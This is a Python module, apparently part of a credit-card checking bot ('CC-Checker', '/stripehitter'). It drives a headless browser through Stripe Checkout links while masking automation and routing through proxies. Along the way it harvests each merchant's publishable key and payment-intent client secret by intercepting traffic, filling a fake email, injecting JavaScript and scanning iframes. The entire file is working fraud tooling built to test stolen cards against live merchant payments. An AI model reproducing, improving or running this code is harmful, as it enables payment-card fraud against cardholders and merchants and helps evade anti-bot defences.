"""
core/stripe_extractor.py — Playwright-based Stripe Checkout Extractor (v2)

Improvements over v1:
- Intercepts ALL Stripe domains including hooks.stripe.com, pay.stripe.com
- Also intercepts REQUEST bodies (not just responses) for secrets
- Tries page.evaluate() to pull secrets from window/JS context
- Waits for payment element iframe to appear before timing out
- Searches full page HTML after all interactions
"""
import asyncio
import re
import json
import logging
from typing import Optional

logger = logging.getLogger("CC-Checker.StripeExtractor")

# Patterns to find in network traffic
PK_RE     = re.compile(r'pk_(?:live|test)_[a-zA-Z0-9]{20,}')
PI_RE     = re.compile(r'pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+')
SI_RE     = re.compile(r'seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+')
AMOUNT_RE = re.compile(r'"amount"\s*:\s*(\d+)')
CUR_RE    = re.compile(r'"currency"\s*:\s*"([a-z]{3})"')
MER_RE    = re.compile(r'"(?:merchantDisplayName|businessName|merchant_name|name)"\s*:\s*"([^"]{2,80})"')

# All Stripe domains that might carry pi_secret
STRIPE_DOMAINS = [
    "stripe.com/api",
    "stripe.com/v1",
    "checkout.stripe.com",
    "api.stripe.com",
    "hooks.stripe.com",
    "pay.stripe.com",
    "js.stripe.com",
    "m.stripe.com",
    "r.stripe.com",
    "q.stripe.com",
]

# JS code to extract secrets from window context
_JS_EXTRACT = """
(function() {
    var result = {pk: '', secret: '', amount: 0, currency: '', merchant: ''};
    try {
        // Search all window properties
        var allText = JSON.stringify(window.__stripe || {}) + ' ';
        // Also check document body
        allText += document.body ? document.body.innerHTML : '';
        
        var pkM = allText.match(/pk_(?:live|test)_[a-zA-Z0-9]{20,}/);
        if (pkM) result.pk = pkM[0];
        
        var piM = allText.match(/pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+/);
        if (piM) result.secret = piM[0];
        
        var siM = allText.match(/seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+/);
        if (siM && !result.secret) result.secret = siM[0];
        
    } catch(e) {}
    return result;
})()
"""


async def extract_stripe_checkout(
    url: str,
    timeout_ms: int = 35000,
    proxy: Optional[str] = None,
) -> dict:
    """
    Open Stripe checkout URL in a headless browser, intercept ALL Stripe network
    responses + requests, and extract pk + client_secret automatically.
    """
    try:
        from playwright.async_api import async_playwright, TimeoutError as PWTimeout
    except ImportError:
        return {"error": "Playwright not installed.\nRun: pip install playwright && playwright install chromium"}

    sid_m = re.search(r'(cs_(?:live|test)_[a-zA-Z0-9]+)', url)
    session_id = sid_m.group(1) if sid_m else ""

    found = {"pk": "", "secret": "", "amount": 0, "currency": "USD", "merchant": "Unknown"}
    done_event = asyncio.Event()

    def _scan_text(text: str):
        """Scan any text blob for Stripe secrets."""
        if not text or len(text) < 5:
            return
        if not found["pk"]:
            pk_m = PK_RE.search(text)
            if pk_m:
                found["pk"] = pk_m.group(0)
                logger.debug(f"PK found: {found['pk'][:25]}...")
        if not found["secret"]:
            pi_m = PI_RE.search(text)
            if pi_m:
                found["secret"] = pi_m.group(0)
                logger.debug(f"PI secret found: {found['secret'][:30]}...")
            else:
                si_m = SI_RE.search(text)
                if si_m:
                    found["secret"] = si_m.group(0)
                    logger.debug(f"SI secret found")
        if not found["amount"]:
            amt_m = AMOUNT_RE.search(text)
            if amt_m:
                found["amount"] = int(amt_m.group(1))
        cur_m = CUR_RE.search(text)
        if cur_m:
            found["currency"] = cur_m.group(1).upper()
        if found["merchant"] == "Unknown":
            mer_m = MER_RE.search(text)
            if mer_m:
                found["merchant"] = mer_m.group(1)
        if found["pk"] and found["secret"]:
            done_event.set()

    async with async_playwright() as pw:
        launch_kwargs = {
            "headless": True,
            "args": [
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-blink-features=AutomationControlled",
                "--disable-web-security",
                "--disable-features=VizDisplayCompositor",
            ]
        }
        if proxy:
            launch_kwargs["proxy"] = {"server": proxy}

        browser = await pw.chromium.launch(**launch_kwargs)
        context = await browser.new_context(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/125.0.0.0 Safari/537.36"
            ),
            viewport={"width": 1280, "height": 720},
            locale="en-US",
            timezone_id="America/New_York",
        )

        page = await context.new_page()

        # ── Intercept RESPONSES ───────────────────────────────────────────────
        async def on_response(response):
            try:
                resp_url = response.url
                if not any(d in resp_url for d in STRIPE_DOMAINS):
                    return
                try:
                    body = await response.text()
                    _scan_text(body)
                except Exception:
                    pass
            except Exception as e:
                logger.debug(f"Response handler error: {e}")

        # ── Intercept REQUESTS — critical: pi_secret is in REQUEST URL params ──
        async def on_request(request):
            try:
                req_url = request.url
                if "stripe.com" not in req_url:
                    return

                # Scan full request URL (pi_secret is a query param in elements/sessions)
                _scan_text(req_url)

                # Also scan POST body
                post_data = request.post_data
                if post_data:
                    _scan_text(post_data)

                # Specifically: api.stripe.com/v1/elements/sessions?...client_secret=pi_xxx...
                if "elements/sessions" in req_url and "secret" in req_url:
                    logger.info(f"elements/sessions URL has secret param: {req_url[:120]}")

            except Exception:
                pass

        page.on("response", on_response)
        page.on("request", on_request)

        # ── Navigate ──────────────────────────────────────────────────────────
        try:
            logger.info(f"Opening Stripe checkout: {url[:80]}...")
            await page.goto(url, wait_until="domcontentloaded", timeout=timeout_ms)
        except PWTimeout:
            logger.warning("Navigation timed out — checking collected data")
        except Exception as e:
            logger.warning(f"Navigation error: {e}")

        # Wait for initial page + JS to run
        await page.wait_for_timeout(4000)

        # Scan initial HTML
        try:
            html = await page.content()
            _scan_text(html)
        except Exception:
            pass

        # ── Step 2: Fill email → click Continue → wait for payment element ───
        if not found["secret"]:
            try:
                email_selectors = [
                    'input[type="email"]',
                    'input[name="email"]',
                    'input[placeholder*="email" i]',
                    'input[id*="email" i]',
                    '#email',
                ]
                email_filled = False
                for sel in email_selectors:
                    try:
                        el = page.locator(sel).first
                        if await el.is_visible(timeout=2000):
                            await el.click()
                            await el.fill("john.test88@gmail.com")
                            await page.wait_for_timeout(600)
                            email_filled = True
                            logger.debug(f"Email filled via: {sel}")
                            break
                    except Exception:
                        continue

                if email_filled:
                    continue_selectors = [
                        'button[type="submit"]',
                        'button:has-text("Continue")',
                        'button:has-text("Next")',
                        'button:has-text("Pay")',
                        '[data-testid="hosted-payment-submit-button"]',
                        '.SubmitButton',
                        'button:has-text("Confirm")',
                    ]
                    for sel in continue_selectors:
                        try:
                            btn = page.locator(sel).first
                            if await btn.is_visible(timeout=2000):
                                await btn.click()
                                logger.debug(f"Clicked continue: {sel}")
                                break
                        except Exception:
                            continue

                    # Wait for payment form to load (longer wait)
                    logger.debug("Waiting for payment element to load...")
                    await page.wait_for_timeout(8000)

                    # Scan page HTML again after payment form loads
                    try:
                        html2 = await page.content()
                        _scan_text(html2)
                    except Exception:
                        pass

                    logger.info(f"After email step — PK: {'found' if found['pk'] else 'missing'}, Secret: {'found' if found['secret'] else 'missing'}")

            except Exception as e:
                logger.debug(f"Form interaction error: {e}")

        # ── Step 3: Try JS evaluate to extract from window context ───────────
        if not found["secret"]:
            try:
                js_result = await page.evaluate(_JS_EXTRACT)
                if js_result:
                    if js_result.get("pk") and not found["pk"]:
                        found["pk"] = js_result["pk"]
                        logger.debug(f"PK from JS: {found['pk'][:25]}...")
                    if js_result.get("secret") and not found["secret"]:
                        found["secret"] = js_result["secret"]
                        logger.debug(f"Secret from JS: {found['secret'][:30]}...")
            except Exception as e:
                logger.debug(f"JS evaluate error: {e}")

        # ── Step 4: Scan all iframes ──────────────────────────────────────────
        if not found["secret"]:
            try:
                for frame in page.frames:
                    try:
                        frame_url = frame.url
                        if not any(d in frame_url for d in STRIPE_DOMAINS):
                            continue
                        frame_content = await frame.content()
                        _scan_text(frame_content)
                        logger.debug(f"Scanned frame: {frame_url[:60]}")
                    except Exception:
                        continue
            except Exception as e:
                logger.debug(f"Frame scan error: {e}")

        # ── Step 5: Wait for done_event with remaining timeout ────────────────
        if not done_event.is_set():
            remaining = max(3.0, (timeout_ms / 1000) - 18.0)
            try:
                await asyncio.wait_for(done_event.wait(), timeout=remaining)
                logger.info("Both PK and secret found")
            except asyncio.TimeoutError:
                logger.info(f"Final timeout. PK: {'OK' if found['pk'] else 'MISSING'}, Secret: {'OK' if found['secret'] else 'MISSING'}")

        await browser.close()

    # ── Build result ──────────────────────────────────────────────────────────
    if not found["pk"]:
        return {
            "error": (
                "Could not find publishable key (pk_live_...).\n\n"
                "Possible reasons:\n"
                "- Checkout link is expired/already paid\n"
                "- Stripe is detecting automation\n"
                "- Link was a test-mode link (pk_test_)"
            )
        }

    if not found["secret"]:
        return {
            "error": (
                f"Found PK ({found['pk'][:25]}...) but no PI/SI secret.\n\n"
                "The payment intent secret was not captured.\n"
                "Try using manual keys:\n"
                "/stripehitter pk_live_xxx pi_xxx_secret_xxx"
            ),
            "pk": found["pk"],
        }

    secret      = found["secret"]
    intent_id   = secret.split("_secret_")[0]
    intent_type = "setup" if secret.startswith("seti_") else "payment"

    return {
        "pk":          found["pk"],
        "secret":      secret,
        "intent_id":   intent_id,
        "intent_type": intent_type,
        "amount":      found["amount"] / 100 if found["amount"] else 0,
        "currency":    found["currency"],
        "merchant":    found["merchant"],
        "session_id":  session_id,
        "url":         url,
    }
